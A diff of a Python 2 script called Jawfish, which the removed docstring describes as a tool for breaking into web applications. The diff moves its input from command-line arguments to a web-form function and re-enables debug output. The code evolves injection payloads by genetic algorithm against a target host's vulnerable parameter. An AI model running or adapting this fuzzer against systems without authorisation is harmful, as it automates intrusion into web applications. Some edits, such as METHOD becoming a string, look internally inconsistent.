@@ -1,12 +1,3 @@
-#!/usr/bin/env python
-
-'''
-Jawfish is a tool designed to break into web applications.
-
-Built on top of Soen Vanned's Forced Evolution.
-https://github.com/soen-vanned/forced-evolution
-'''
-
 import requests
 import time
 from sys import argv
@@ -14,31 +5,6 @@ import random
 from Queue import PriorityQueue
 import base64
 import zlib
-
-print """
-       _                 __ _     _
-      | |               / _(_)   | |
-      | | __ ___      _| |_ _ ___| |__
-  _   | |/ _` \ \ /\ / |  _| / __| '_ \
- | |__| | (_| |\ V  V /| | | \__ | | | |
-  \____/ \__,_| \_/\_/ |_| |_|___|_| |_|
-"""
-
-
-def usage():
-    print 'Usage:'
-    print '  python jf.py <options>'
-    print '  Options:'
-    print '    TARGET=<target IP / hostname>'
-    print '    ADDR=<directory>'
-    print '    VULN_VAR=<vulnerable variable>'
-    print '    METHOD=<post/get>'
-    print '    OTHER_VARIABLES=[other variables for post/get request]'
-    print '      VAR1=DATA1&VAR2=DATA2'
-    print '    GOAL_TEXT=<server response indicating successful exploitation>'
-    print
-    print ' TARGET,ADDR,VULN_VAR,METHOD,GOAL_TEXT are required'
-
 
 start_time = time.time()
 OTHER_VARIABLES = {}
@@ -65,42 +31,23 @@ DB = ''
 ###DBENDMARKER###
 
 
-def process_command_line():
+def process_web_form(web_TARGET, web_ADDR, web_VULN_VAR, web_METHOD, web_GOAL_TEXT):
     global BASE_RESPONSE, REQ_TOTAL, METHOD, GOAL_TEXT, TARGET, ADDR,\
         OTHER_VARIABLES, VULN_VAR
-    if ((len(argv) != 6) and (len(argv) != 7)):
-        usage()
     try:
-        TARGET = argv[1].split('=')[1]
+        TARGET = web_TARGET
         print '[+]\tTarget %s acquired!' % TARGET
-        ADDR = argv[2].split('=')[1]
+        ADDR = web_ADDR
         if ADDR[0] == '/':
             ADDR = ADDR[1:]
         print '[+]\tPath %s acquired!' % ADDR
-        VULN_VAR = argv[3].split('=')[1]
+        VULN_VAR = web_VULN_VAR
         print '[+]\tPotentially vulnerable variable %s registered!' % VULN_VAR
-        METHOD = (((argv[4].split('=')[1] == 'post') and 1) or 0)
+        METHOD = web_METHOD.lower()
         print '[+]\tUsing method [%s] for GREAT success' %\
             ((METHOD and 'post') or 'get')
         OTHER_VARIABLES = {}
-        if (len(argv) == 7):
-            ov = argv[5][len('OTHER_VARIABLES='):]
-            ov.replace('\"', '')
-            ov = ov.split('&')
-            #print ov
-            for i in ov:
-                (tmp_a, tmp_b) = i.split('=')
-                #print 'setting %s to %s' % (tmp_a, tmp_b)
-                OTHER_VARIABLES[tmp_a] = tmp_b
-            #ov = ov.split('&')
-            #ov = ov[1:]
-            #OTHER_VARIABLES = {}
-            #for i in range(0, len(ov) /2):
-            #  OTHER_VARIABLES[ov[i * 2]] = ov[i * 2 + 1]
-            #print OTHER_VARIABLES
-            GOAL_TEXT = argv[6].split('=')[1]
-        else:
-            GOAL_TEXT = argv[5].split('=')[1]
+        GOAL_TEXT = web_GOAL_TEXT
         print '[+]\tAttempting to gain a base heuristic...'
         OTHER_VARIABLES[VULN_VAR] = 'AAAA'
         BASE_RESPONSE = requests.get(
@@ -119,7 +66,7 @@ def process_command_line():
                 exit(0)
         return True
     except:
-        print 'commandline argument FAIL\n\n'
+        print 'web form argument FAIL\n\n'
         return False
 
 
@@ -184,9 +131,9 @@ def cull_it(c):
     c_temp = PriorityQueue()
     qsize = c.qsize()
     l = int(qsize - qsize * CULL_RATE)
-    # print '[i]\tPopulation size %d, cull rate %s, living specimens: %d' %\
-    # (c.qsize(), str(CULL_RATE), l)
-    # print '[.]\tBeginning the cull of underperforming creatures...'
+    print '[i]\tPopulation size %d, cull rate %s, living specimens: %d' %\
+    (c.qsize(), str(CULL_RATE), l)
+    print '[.]\tBeginning the cull of underperforming creatures...'
     for i in range(l):
         flag = 0
         while flag == 0:
@@ -194,7 +141,7 @@ def cull_it(c):
             if tmp[1].genome != '':
                 c_temp.put(tmp)
                 flag = 1
-    # print '[+]\tCull done!'
+    print '[+]\tCull done!'
     return c_temp
 
 
@@ -323,13 +270,13 @@ def main():
             for ii in range(0, GENE_POOL_INFLUENCE-1):
                 c1.put((50, Creature(0, mutate(i))))
         print '[+]\tSuccess'
-        #print '[+]\tPre-breeeding in loaded creatures with the population' +\
-        #    ' for great success'
-        #while not c1.empty():
-        #    c = c1.get()[1]
-        #    c0.append(c)
-        #c1 = breed_it(c0)
-        #c1 = c0
+        print '[+]\tPre-breeding in loaded creatures with the population' +\
+            ' for great success'
+        while not c1.empty():
+            c = c1.get()[1]
+            c0.append(c)
+        c1 = breed_it(c0)
+        c1 = c0
         print '[+]\tSuccess'
         exploit_found = 0
         while exploit_found == 0:
@@ -349,8 +296,8 @@ def main():
                     exploit_found = 1
                     break
                 c2.put((c.score, c))
-            # print '[i]\tEfficiency %s, cached[%d], total[%d]' %\
-            # (str((total_c-cached_c) * 1.0 / total_c),cached_c,total_c)
+            print '[i]\tEfficiency %s, cached[%d], total[%d]' %\
+            (str((total_c-cached_c) * 1.0 / total_c),cached_c,total_c)
             c3 = cull_it(c2)
             c4 = []
             while not c3.empty():
